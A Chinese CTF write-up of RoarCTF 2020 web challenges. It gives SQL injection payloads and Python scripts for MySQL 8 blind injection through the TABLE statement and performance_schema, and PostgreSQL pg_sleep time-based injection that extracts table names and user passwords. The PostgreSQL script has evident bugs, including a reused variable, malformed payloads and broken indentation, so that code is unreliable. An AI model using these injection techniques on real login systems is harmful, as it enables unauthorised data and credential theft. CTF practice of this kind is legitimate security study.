---
title: RORCTF2020 部分wp
date: 2020-12-06 11:00
categories: 比赛
---

>跟着太空人师傅一队，被带飞，spaceman太强辣！最终取得总积分26名，也得奖了很开心，只是现在还没说奖励是啥哈哈哈，放张图纪念一下嘿嘿
![积分](https://img-blog.csdnimg.cn/20201212213207921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

<!-- TOC -->

- [MISC](#misc)
  - [FM](#fm)
- [WEB](#web)
  - [ezsql](#ezsql)
  - [你能登陆吗&你能登陆吗2](#你能登陆吗你能登陆吗2)

<!-- /TOC -->
<!--more-->
# MISC
## FM
Ubuntu下载gqrx，然后载入iq文件，将Filter width改为`WFM(mono)`接着start，去听声音，读出来的数字+字母即为flag

# WEB
## ezsql
>MySql8新版特性，使用tqble代替select\
多谢M3师傅提醒

fuzz过滤很多，最难顶的union select没了，空格可以`/**/`绕过，MySQL8.0新特性的table语句派上用场了，官方手册[点此](https://dev.mysql.com/doc/refman/8.0/en/)，一顿操作发现怎么都需要得到表名才行，理论可以使用information库得到表，但是table语法不允许写任何where，也就造成数据太多，limit不易控制，一番探索发现`performance_schema.table_handles`，官方手册[点此](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-system-variables.html#sysvar_performance_schema_max_table_handles)，MySQL的性能模式架构，其中的`table_handles`记录了所有打开的表，用于公开表锁信息，官方手册[点此](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-table-handles-table.html)
怎么得到当前库的所有表名？或者说flag的表名，我在此用了盲注，通过MySQL对于两个select查询结果的按位比较进行猜测flag表名，在GYCTF2020-ezsqli已经提到过这个，表名盲猜`flllag`，因为脚本写出来的时间较长索性直接bp手注盲测，猜测表名payload（pass盲注可出，库名用sqlmap跑的），本地测试table_handles有八个字段，按位比较猜测 f 开头的表名，出现多条符合条件的记录，取了第一个，本地可以看到很多记录是重复的
```
username=admin'AND/**/('TABLE','ctf','f',4,5,6,7,8)<(table/**/performance_schema.table_handles/**/limit/**/$1$,1)#&password=gml666
```
接着测试表名，0-9a-z，每次手动加1，直到爆破的length相同，得到表名：f11114g
```
username=admin'AND/**/('TABLE','ctf','f§1§',4,5,6,7,8)<(table/**/performance_schema.table_handles/**/limit/**/10,1)#&password=gml666
```
最后flag脚本：
```
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-12-5 13:00
# @challenges： ROARCTF2020 ezsql
import requests
url = "http://139.129.98.9:30003/login.php"
data = {"username":"","password":"gml666"}
flag = ""
tbname = ""
s = requests.session()
for x in range(1,43):
    for i in r'flag{0123456789bcdehijkmnopqrstuvwxyz-}':
        payload = f"admin'AND/**/ascii(substr((table/**/f11114g/**/limit/**/1,1),{x},1))={ord(i)}#"
        data["username"] = payload
        print(data)
        s = requests.post(url, data = data)
        if 'success' in s.text:
            flag += i
            print(flag)
            break
```

## 你能登陆吗&你能登陆吗2
>PostgreSQL 时间盲注\
多谢Macchiato提醒

应该是预期解，时间盲注（sqlmap来的基本语句），可以用一个脚本去跑
```
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-12-6
# @challenges： ROARCTF2020 你能登陆吗

import requests

url = "http://139.129.98.9:30007"
data = {"username":"admin","password":""}
s = requests.session()

def db():
    db = ""
    for i in range(1, 100):
        for s in r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-{}@._':
            data["password"] = "admin'/**/AND/**/6489=(case/**/when(SUBSTR(current_database(),{},1)='{}')/**/then/**/(select/**/1935/**/FROM/**/pg_sleep(5))/**/else/**/0/**/end)--2".format(i, s)
            s = requests.post(url, data=data)
            time = s.elapsed.total_seconds()
            print(data)
            if time > 5:
                db += s
                print(db)
                print(i)
                break

def tables():
    tables = ""
    for i in range(1, 100):
        for s in r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-{}@._':
            data["password"] = "username=admin&password=admin'/**/AND/**/6489=(case/**/when(SUBSTR((SELECT/**/tablename/**/FROM/**/pg_tables/**/WHERE/**/schemaname/**/IN/**/('public')),{},1)='{}')/**/then/**/(select/**/1935/**/FROM/**/pg_sleep(5))/**/else/**/0/**/end)--2".format(
                i, s)
            s = requests.post(url, data=data)
            time = s.elapsed.total_seconds()
            print(data)
            if time > 5:
                tables += s
                print(tables)
                print(i)
                break

def password():
    password = ""
    for i in range(1, 100):
        for s in r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-{}@._':
            data["password"] = "username=admin&password=admin'/**/AND/**/6489=(case/**/when(SUBSTR((select/**/password/**/from/**/public.users),{},1)='{}')/**/then/**/(select/**/1935/**/FROM/**/pg_sleep(5))/**/else/**/0/**/end)--2".format(
                i, s)
            s = requests.post(url, data=data)
            time = s.elapsed.total_seconds()
            print(data)
            if time > 5:
                password += s
                print(password)
                print(i)
                break

if __name__ == '__main__':
	db()
	tables()
    password()
```
